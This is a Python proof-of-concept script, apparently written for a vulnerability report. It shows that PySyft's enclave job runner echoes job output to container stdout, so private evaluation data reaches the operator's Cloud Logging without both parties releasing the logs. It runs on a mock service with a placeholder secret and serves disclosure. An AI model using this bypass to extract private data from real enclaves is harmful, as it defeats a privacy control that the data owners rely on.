#!/usr/bin/env python3
"""
on Confidential Space, job output bypasses the two-party log-disclosure gate.

Target: PySyft dev. A job's logs are meant to "stay in the enclave unless both
of us release them" (double-blind-eval notebook; `request_disclosures=["logs"]`
+ `update_disclosures`). But the enclave runs approved jobs with
`stream_output=True` (syft_rds default), and syft_job's job_runner echoes every
stdout/stderr line of the job to the *enclave process's* stdout
(`print(f"{log_prefix} STDERR: {line}")`). The Confidential Space image sets
`tee.launch_policy.log_redirect=always`, so the container's stdout goes to the
operator's Cloud Logging.

Scenario: the evaluator's approved eval job hits an exception whose message
quotes a prompt (the notebook itself warns "An exception message can quote
data"). Neither party releases the logs. The disclosure gate holds for the
Drive copies, but the same text has already been written to the container's
stdout, i.e. to the model owner's (operator's) Cloud Logging.

Here the enclave runs in-process over PySyft's mock Drive; we capture the
enclave process's stdout, which is what Confidential Space forwards.
Vendor code driven unmodified: SyftEnclaveClient job flow, syft_rds/syft_job runner.
"""

import contextlib
import io
import os
import random
import sys
import tempfile
from pathlib import Path

os.environ.setdefault("PRE_SYNC", "false")

from syft_enclaves import SyftEnclaveClient

SECRET = "RESERVE-PROMPT-0412: how do I <redacted hazardous request>"
JOB = """\
import csv, syft as sy
p = sy.resolve_dataset_file_path("benchmark", owner_email="{ev}")
rows = list(csv.DictReader(open(p)))
for r in rows:
    # a bug in the eval code: the model call fails and the error quotes the input
    raise ValueError(f"generation failed for prompt {{r['prompt_text']!r}}")
"""


class Tee(io.TextIOBase):
    def __init__(self, *s): self.s = s
    def write(self, x):
        for s in self.s: s.write(x)
        return len(x)
    def flush(self):
        for s in self.s: s.flush()


def tmpfile(name, text):
    d = Path(tempfile.mkdtemp()) / f"poc-{random.randint(0, 10**6)}"
    d.mkdir(parents=True)
    (d / name).write_text(text)
    return d / name


def main() -> int:
    enclave, do_model, do_eval, ds = SyftEnclaveClient.quad_with_mock_drive_service_connection(
        use_in_memory_cache=False, encryption=True)
    do_eval.create_dataset(name="benchmark",
                           mock_path=tmpfile("mock.csv", "prompt_uid,prompt_text\nm1,mock\n"),
                           private_path=tmpfile("private.csv", f"prompt_uid,prompt_text\np1,{SECRET}\n"),
                           summary="reserve set", users=[enclave.email], upload_private=True, sync=False)
    do_eval.share_private_dataset("benchmark", enclave.email)
    do_eval.sync(); do_model.sync(); ds.sync()

    ds.submit_python_job(enclave.email, str(tmpfile("main.py", JOB.format(ev=do_eval.email))),
                         "eval", datasets={do_eval.email: ["benchmark"]},
                         request_disclosures=["logs"])
    enclave.sync(); enclave.receive_jobs()
    do_model.sync(); do_eval.sync()
    do_model.approve_job(do_model.jobs["eval"])
    do_eval.approve_job(do_eval.jobs["eval"])
    enclave.sync()

    container_stdout = io.StringIO()
    with contextlib.redirect_stdout(Tee(sys.__stdout__, container_stdout)):
        enclave.run_jobs()
        enclave.distribute_results()

    job = enclave.jobs["eval"]
    print("\n[enclave] job status:", job.status,
          "| logs released by all parties:", "logs" in enclave.granted_disclosures(job))
    leaked = SECRET in container_stdout.getvalue()
    print("[container stdout] contains the evaluator's prompt:", leaked)
    for line in container_stdout.getvalue().splitlines():
        if SECRET in line:
            print("   ", line.strip()[:160])
            break
    ok = leaked and "logs" not in enclave.granted_disclosures(job)
    print("RESULT:", "REPRODUCED: job output reached container stdout without the two-party log release "
          "(it reaches Cloud Logging only if the launch policy allows log redirection)"
          if ok else "not reproduced")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
